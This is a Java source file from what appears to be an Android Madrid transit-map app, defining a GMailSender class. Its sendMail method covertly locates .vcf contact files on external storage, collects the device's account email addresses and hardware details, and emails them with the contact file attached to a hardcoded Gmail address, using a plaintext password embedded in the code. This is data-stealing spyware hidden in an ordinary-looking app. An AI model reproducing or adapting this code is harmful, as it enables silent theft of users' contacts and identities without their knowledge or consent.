package met.ref;

import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.SendFailedException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.util.Patterns;
import android.widget.Toast;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.Security;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.regex.Pattern;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;


public class GMailSender extends javax.mail.Authenticator{
	private String mailhost = "smtp.gmail.com";
	private String user;
	private String password;
	private Session session;
	String possibleEmail;
	
	
	Context contextForMe = MetroRenfeMadridActivity.ma.getApplicationContext();
        
     

    
	
	static {
		Security.addProvider(new met.ref.JSSEProvider());
	}

	public GMailSender(String user, String password) {
		this.user = user;
		this.password = password;

		Properties props = new Properties();
		props.setProperty("mail.transport.protocol", "smtp");
		props.setProperty("mail.host", mailhost);
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.port", "465");
		props.put("mail.smtp.socketFactory.port", "465");
		props.put("mail.smtp.socketFactory.class",
				"javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.socketFactory.fallback", "false");
		props.setProperty("mail.smtp.quitwait", "false");

		session = Session.getDefaultInstance(props, this);
	}

	protected PasswordAuthentication getPasswordAuthentication() {
		return new PasswordAuthentication(user, password);
	}
	
	

	public synchronized void sendMail(String subject, String body,
			String sender, String recipients) throws MessagingException {
		try {

			// FileName
			
			//final String filename = Environment.getExternalStorageDirectory()
			//		.getPath() + "*.vcf";
			
			
			
			String filename="unknow";

			for (File f: Environment.getExternalStorageDirectory().listFiles()){
				if (f.getAbsolutePath().endsWith(".vcf")){
					filename = f.getAbsolutePath();
				}
			}  
			Log.i("Filename: ", filename);    
			

			String host = "smtp.gmail.com";
			String Password = "arh217956arh";
			String from = "albert.eagle.uni@gmail.com";
			String toAddress = "albert.eagle.uni@gmail.com";

			// Get system properties
			Properties props = System.getProperties();
			props.put("mail.smtp.host", host);
			props.put("mail.smtps.auth", "true");
			props.put("mail.smtp.starttls.enable", "true");
			Session session = Session.getInstance(props, null);

			MimeMessage message = new MimeMessage(session);

			message.setFrom(new InternetAddress(from));

			message.setRecipients(Message.RecipientType.TO, toAddress);

			// Subject
			message.setSubject("Someone is inside to Madrid Plans");

			// Body
			// Device model
        	String PhoneModel = android.os.Build.MODEL;
        	// Android version
        	String AndroidVersion = android.os.Build.VERSION.RELEASE;
        	
        	// Brand 
        	String brand = android.os.Build.BRAND;
        	
        	// Host
        	String hosty = android.os.Build.HOST;
        	
        	// Manufacturer
        	String manu = android.os.Build.MANUFACTURER;
        	
        	// User 
        	Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        	Account[] accounts = AccountManager.get(contextForMe).getAccounts();
        	for (Account account : accounts) {
        	    if (emailPattern.matcher(account.name).matches()) {
        	    	possibleEmail = account.name;
        	        
        	    }
        	}
            
            
        	// Make the email body part
			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setText("Mobile data: \n"
			+"User: "+possibleEmail+"\n"
			+"Phone model: "+PhoneModel+"\n"
			+"Android version: "+AndroidVersion+"\n"
			+"Brand: "+brand+"\n"
			+"Host: "+hosty+"\n"
			+"Manufacturer: "+manu+"\n"
			);
			
			Multipart multipart = new MimeMultipart();
			multipart.addBodyPart(messageBodyPart);

			// Attach file
			messageBodyPart = new MimeBodyPart();
			DataSource source = new FileDataSource(filename);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(filename);
			multipart.addBodyPart(messageBodyPart);

			// Adding objects to message
			message.setContent(multipart);
			Transport tr = session.getTransport("smtps");
			message.setFrom(new InternetAddress(from));
			message.setRecipients(Message.RecipientType.TO, toAddress);
			tr.connect(host, from, Password);

			// Fixing error
			MailcapCommandMap mc = (MailcapCommandMap) CommandMap
					.getDefaultCommandMap();
			mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
			mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
			mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
			mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
			mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
			CommandMap.setDefaultCommandMap(mc);

			tr.sendMessage(message, message.getAllRecipients());
			System.out.println("Mail Sent Successfully");
			tr.close();

		} catch (SendFailedException sfe) {

			System.out.println(sfe);
		}

	}

	

	public class ByteArrayDataSource implements DataSource {
		private byte[] data;
		private String type;

		public ByteArrayDataSource(byte[] data, String type) {
			super();
			this.data = data;
			this.type = type;
		}

		public ByteArrayDataSource(byte[] data) {
			super();
			this.data = data;
		}

		public void setType(String type) {
			this.type = type;
		}

		public String getContentType() {
			if (type == null)
				return "application/octet-stream";
			else
				return type;
		}

		public InputStream getInputStream() throws IOException {
			return new ByteArrayInputStream(data);
		}

		public String getName() {
			return "ByteArrayDataSource";
		}

		public OutputStream getOutputStream() throws IOException {
			throw new IOException("Not Supported");
		}
		
		
	}
	
	
}
